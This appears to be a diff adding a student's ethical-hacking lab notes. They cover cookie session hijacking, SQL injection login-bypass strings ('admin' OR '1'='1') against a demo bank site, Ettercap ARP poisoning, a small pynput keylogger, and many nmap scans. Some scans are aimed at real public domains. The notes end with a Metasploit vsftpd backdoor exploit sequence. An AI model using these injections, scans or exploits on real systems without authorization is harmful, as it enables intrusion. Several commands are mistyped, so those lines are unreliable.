@@ -1,0 +1,124 @@
+session hijacking:
+open acunetix acuart
+signup
+inspect
+application
+cookies
+-----------------------------------------------
+sql injection:
+
+altoro mutual
+username: admin‘ OR ‘1’=’1
+pass: admin
+
+username: administrator‘ OR ‘1’=’1
+pass:123
+----------------------------------------------------
+networking commands:
+
+ipconfig
+ipconfig/all
+ipconfig/displaydns
+ping (ip address)
+tracert www.google.com
+netstat
+-----------------------------------------------------
+ARP poisoning:
+
+open kali
+sudo Ettercap -G
+target 1 and 2
+wireshark &
+eth0
+red button
+target 2 arp poisoning
+sniff remote connections
+
+normal window:
+testhtml5.vulnweb.com
+login
+
+cmd:
+ipconfig
+
+kali:
+
+arp search in searchbar
+---------------------------------------------------------
+keylogger:
+
+from pynput.keyboard import Key, Listener 
+def keypress(key):
+    print(key, "is pressed") 
+def keyrelease(key):
+    if key==Key.esc:
+        return False
+
+with Listener(on_press=keypress, on_release=keyrelease) as listener:
+    listener.join()
+--------------------------------------------------------------------
+nmap:
+cmd:
+nmap
+nmap-sL 192.168.127.1(scan)
+nmap -sL www.google.com
+nmap-sV 192.168.10.2(grab)
+nmap-sV www.siesascs.edu.in(grab)
+nmap -O www.geeksforgeeks(os fingerprinting)
+nmap -O 192.168.10.2 {default getway}
+nmap -p22,443 www.google.com [here are port aswerll as domain]
+namp- p1-65535 www.google.com [ it wll give 65535 ports or less also ]
+nmap -A www.google.com
+namp –T4-sV www.google.com
+nmap –top-ports 20 www.siesascs.edi.in
+nmap –traceroute www.google.com
+
+nmap –sA www.geeksforgeeks.org
+nmap –sS www.geeksforgeeks.org
+nmap –sS –p402,443,22 www.google.com
+nmap -sS -p402,443,22 -T5 www.google.com [time based scann]
+nmap –sF –p402,443,22 www.google.com
+XMAS scan ◻ nmap –sX –p402,443,22 www.google.com
+Null packet scan ◻ nmap –sN –p402,443,22 www.google.com
+
+----------------------------------------------------------------------------------------
+RC4
+Open CrpTool in top click on new file -> there write your password (here it is hello)
+In this dialog change the 00 to 08 and click on Encrypt
+-----------------------------------------------------------------------------------------
+
+malware analysis:
+
+Threat.zone
+virustotal
+havebeenpawned
+------------------------------------------------------------------------------------------
+Metasploit:
+msfadmin
+msfadmin
+
+windows cmd:
+ipconfig
+
+kali cmd:
+ipconfig
+ping(ip address)
+
+nmap -sV(ip address)
+
+sudo msfconsole
+
+search vsftpd
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.10.229
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact
+exploit
+
+
+
+
+
+
+
+
+
